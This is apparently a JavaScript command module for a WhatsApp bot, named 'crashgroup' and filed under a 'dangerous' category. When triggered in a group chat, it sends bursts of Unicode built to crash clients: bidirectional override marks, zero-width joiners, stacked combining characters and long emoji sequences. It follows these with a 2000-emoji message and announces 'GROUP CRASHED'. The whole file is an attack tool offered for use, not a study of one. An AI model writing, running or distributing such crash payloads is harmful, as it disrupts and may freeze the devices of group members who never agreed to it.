export default {
  name: 'crashgroup',
  description: 'Crash a group with special characters',
  category: 'dangerous',
  aliases: ['gcrash', 'groupcrash'],
  ownerOnly: true,
  async execute(sock, msg, args, prefix) {
    const chatId = msg.key.remoteJid;
    
    if (!chatId.endsWith('@g.us')) {
      await sock.sendMessage(chatId, {
        text: `╭━━━〔 ❌ ERROR 〕━━━┈⊷
┃ This command can only be used in groups.
╰━━━━━━━━━━━━━━━┈⊷`
      }, { quoted: msg });
      return;
    }

    await sock.sendMessage(chatId, {
      text: `╭━━━〔 ☠️ CRASHING GROUP 〕━━━┈⊷
┃ 🧛 "The darkness crushes the coven..."
╰━━━━━━━━━━━━━━━┈⊷`
    }, { quoted: msg });

    try {
      const crashMessages = [
        '‮⁦⁦⁦⁩⁩⁩‍👨‍👩‍👧‍👦‍👨‍👩‍👧‍👦‍👨‍👩‍👧‍👦',
        '🫸🫷🫸🫷🫸🫷🫸🫷🫸🫷',
        '⁣‍‌‍‌‍‌‍‌‍‌‍‌‍‌‍‌‍‌‍‌‍‌‍‌',
        '⃤⃤⃤⃤⃤⃤⃤⃤⃤⃤⃤⃤⃤⃤⃤⃤⃤⃤⃤',
        '̵̶̷̸̵̶̷̸̵̶̷̸̵̶̷̸̵̶̷̸',
        '࿓࿔࿓࿔࿓࿔࿓࿔࿓࿔࿓࿔࿓࿔',
        '𒀀𒀁𒀂𒀃𒀄𒀅𒀆𒀇𒀈𒀉𒀊𒀋',
        '꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂',
        '𖦹𖦺𖦻𖦼𖦽𖦾𖦿𖧀𖧁𖧂𖧃𖧄𖧅'
      ];

      for (let i = 0; i < 5; i++) {
        try {
          await sock.sendMessage(chatId, {
            text: crashMessages[i % crashMessages.length].repeat(3)
          });
          await new Promise(resolve => setTimeout(resolve, 300));
        } catch {}
      }

      let largeMessage = '';
      for (let i = 0; i < 2000; i++) {
        largeMessage += '🩸';
      }

      await sock.sendMessage(chatId, {
        text: largeMessage
      });

      await sock.sendMessage(chatId, {
        text: `╭━━━〔 ✅ GROUP CRASHED 〕━━━┈⊷
┃ The coven has been crashed!
┃ 
┃ 🧛 "The darkness consumes."
╰━━━━━━━━━━━━━━━┈⊷`
      }, { quoted: msg });

    } catch (error) {
      await sock.sendMessage(chatId, {
        text: `╭━━━〔 ❌ ERROR 〕━━━┈⊷
┃ ${error.message}
╰━━━━━━━━━━━━━━━┈⊷`
      }, { quoted: msg });
    }
  }
};
